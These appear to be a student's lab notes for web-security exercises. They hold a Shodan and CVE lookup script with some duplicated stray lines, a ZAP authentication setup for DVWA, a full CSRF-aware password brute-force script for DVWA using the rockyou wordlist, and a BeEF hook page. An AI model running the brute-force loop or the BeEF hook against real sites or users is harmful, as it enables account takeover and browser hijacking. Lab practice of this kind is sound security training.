exp1(shodan information retrieval ):

#!/bin/bash

# MongoDB connection details
MONGO_HOST="127.0.0.1"
MONGO_PORT="27017"
DB1="db1"  # Database for NVD data
DB2="db2"  # Database for MITRE data
DB3="db3"  # Database for Shodan responses

# Shodan API key (replace with your actual API key)
SHODAN_API=""

# Function to fetch vulnerabilities from NVD
fetch_nvd() {
    echo "Fetching NVD data..."
    # Fetch raw data from NVD
    curl -s 'https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&search_type=last3months&isCpeNameSearch=false' \
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8' \
        -H 'Connection: keep-alive' > nist.gov.txt

    # Extract CVE IDs and format as JSON
    echo "[" > cve_list.json
    cat nist.gov.txt | grep -E "CVE-[0-9]-[0-9]" -o | sort -u | sed 's/.*/{ "cve_id": "&" },/' >> cve_list.json
    sed -i '$ s/,$//' cve_list.json  # Remove the last trailing comma
    echo "]" >> cve_list.json

    echo "Extracted CVEs saved to cve_list.json."

    # Import JSON to MongoDB
    mongoimport --host=$MONGO_HOST --port=$MONGO_PORT --db=$DB1 --collection=cves --jsonArray --file=cve_list.json
    echo "NVD data imported into MongoDB ($DB1)."
}

# Function to fetch vulnerabilities from MITRE
fetch_mitre() {
    echo "Fetching MITRE data..."
    curl -s 'https://cve.mitre.org/data/downloads/allitems.csv' -o allitems.csv
    
    # Skip metadata lines and parse actual CVE entries
    grep "^\"CVE-" allitems.csv | awk -F, '{print "{ \"cve_id\": " $1 ", \"description\": " $3 " }"}' > mitre_data.json
    
    # Wrap in JSON array
    sed -i '1s/^/[/' mitre_data.json
    echo "]" >> mitre_data.json
    
    echo "MITRE data converted to JSON."
    mongoimport --host=$MONGO_HOST --port=$MONGO_PORT --db=$DB2 --collection=cves --jsonArray --file=mitre_data.json
    echo "MITRE data imported into MongoDB ($DB2)."
}   
 # Import JSON to MongoDB
    mongoimport --host=$MONGO_HOST --port=$MONGO_PORT --db=$DB2 --collection=cves --jsonArray --file=mitre_data.json
    echo "MITRE data imported into MongoDB ($DB2)."


# Function to query Shodan with a CVE ID
query_shodan() {
    echo "Enter the CVE ID to query:"
    read CVE_ID

    # Query Shodan using the API key
    RESPONSE=$(shodan search "$CVE_ID" --key $SHODAN_API --limit 5)

    # Save the response in JSON format and import it into MongoDB
    echo $RESPONSE | jq '.' > shodan_response.json
    mongoimport --host=$MONGO_HOST --port=$MONGO_PORT --db=$DB3 --collection=shodan_responses --jsonArray --file=shodan_response.json

    echo "Shodan response saved in MongoDB ($DB3)."
}

# Function to view Shodan responses
view_shodan() {
    echo "Viewing Shodan responses stored in MongoDB..."
    mongo $DB3 --eval 'db.shodan_responses.find().pretty()'
}

# Main menu
while true; do
    echo "Select an option:"
    echo "1. Fetch NVD vulnerabilities"
    echo "2. Fetch MITRE vulnerabilities"
    echo "3. Query Shodan with CVE ID"
    echo "4. View Shodan responses"
    echo "5. Exit"
    read OPTION

    case $OPTION in
        1)
            fetch_nvd
            ;;
        2)
            fetch_mitre
            ;;
        3)
            query_shodan
            ;;
        4)
            view_shodan
            ;;
        5)
            echo "Exiting the tool. Goodbye!"
            break
            ;;
        *)
            echo "Invalid option. Please try again."
            ;;
    esac
done
exp3(zap attack):


function authenticate(helper, paramsValues,credentials) {
var loginUrl = paramsValues.get("Login URL");
var csrfTokenName = paramsValues.get("CSRFField");
var csrfTokenValue =
extractInputFieldValue(getPageContent(helper,loginUrl), csrfTokenName);
var postData = paramsValues.get("POST Data");
postData = postData.replace('{%username%}',
encodeURIComponent(credentials.getParam("Username")));
postData = postData.replace('{%password%}',encodeURIComponent(credentials.getParam("Password")));
postData = postData.replace('{%' + csrfTokenName+ '%}', encodeURIComponent(csrfTokenValue));

var msg = sendAndReceive(helper, loginUrl,postData);
return msg;
}
function getRequiredParamsNames() {
return [ "Login URL", "CSRF Field", "POST Data"];
}
function getOptionalParamsNames() {
return [];
}
function getCredentialsParamsNames() {
return [ "Username", "Password" ];
}
function getPageContent(helper, url) {
var msg = sendAndReceive(helper, url);
return msg.getResponseBody().toString();
}
function sendAndReceive(helper, url, postData) {
var msg = helper.prepareMessage();
var method = "GET";
if (postData) {
method = "POST";
msg.setRequestBody(postData);
}
var requestUri = new
org.apache.commons.httpclient.URI(url, true);
var requestHeader = new
org.parosproxy.paros.network.HttpRequestHeader(method, requestUri, "HTTP/1.0");
msg.setRequestHeader(requestHeader);
helper.sendAndReceive(msg);
return msg;
}
function extractInputFieldValue(page, fieldName) {
// Rhino:
// var src = new
net.htmlparser.jericho.Source(page);
// Nashorn:
var Source =
Java.type("net.htmlparser.jericho.Source");
var src = new Source(page);
var it = src.getAllElements('input').iterator();
while (it.hasNext()) {
var element = it.next();
if (element.getAttributeValue('name') ==
fieldName) {
return
element.getAttributeValue('value');
}
}
return '';
}


fields to be  copied :

1.inclde in content     \Qhttp://localhost/DVWA\E.*
2.Exculde from context  add 3
        i. \Qhttp://localhost/DVWA/login.php\E
	ii. \Qhttp://localhost/DVWA/logout.php\E
	iii. \Qhttp://localhost/DVWA/setup.php\E

3.authentication
     manual auth to Script-based Authentication.
     then select DVWA auth > load
     1.Login URL:   http://localhost/DVWA/login.php
     2.CSRF Field: user_token
     3.POST Data: username={%username%}&password={%password%}&Login=Log in&user_token={%user_token%}
     4.Regex pattern identified in Logged in response messages:     \Q<a href="logout.php">Logout</a>\E
     5.Regex pattern identified in Logged out response messages: (?:Location: [./]*login\.php)|(?:\Q<form action="login.php" method="post">\E)


exp4(brute force):

#!/bin/bash
# Quick PoC template for HTTP GET form brute force with CSRF token
# Target: DVWA v1.10 (Brute Force - High)
#   Date: 2015-11-07
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/dvwa/bruteforce-high/

## Variables
URL="http://192.168.1.44/DVWA"
DVWA_USER="admin"
DVWA_PASS="password"
USER_LIST="/usr/share/seclists/Usernames/top_shortlist.txt"
PASS_LIST="/usr/share/seclists/Passwords/rockyou.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Welcome to the password protected area"

## Anti CSRF token
CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
sed -i '/security/d' /tmp/dvwa.cookie

## Login to DVWA core
curl -s -b /tmp/dvwa.cookie -d "username=${DVWA_USER}&password=${DVWA_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" >/dev/null
[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Feedback for user
    echo "[i] Try ${i}: ${_USER} // ${_PASS}"

    ## CSRF token
    USER_TOKEN="$( curl -s -b 'security=high' -b /tmp/dvwa.cookie "${URL}/vulnerabilities/brute/" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"

    ## Connect to server
    REQUEST="$( curl -s -b 'security=high' -b /tmp/dvwa.cookie "${URL}/vulnerabilities/brute/?username=${_USER}&password=${_PASS}&user_token=${USER_TOKEN}&Login=Login" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[i] Found!"
      echo "[i] Username: ${_USER}"
      echo "[i] Password: ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f /tmp/dvwa.cookie


exp5(beef):


<html>
<head></head>
<body>
<h1> Hello </h1>
<script src="http://127.0.0.1:3000/hook.js"></script>
</body>
</html>

file:///home/kali/vuln.html

github for juice shop:

https://github.com/bsqrl/juice-shop-walkthrough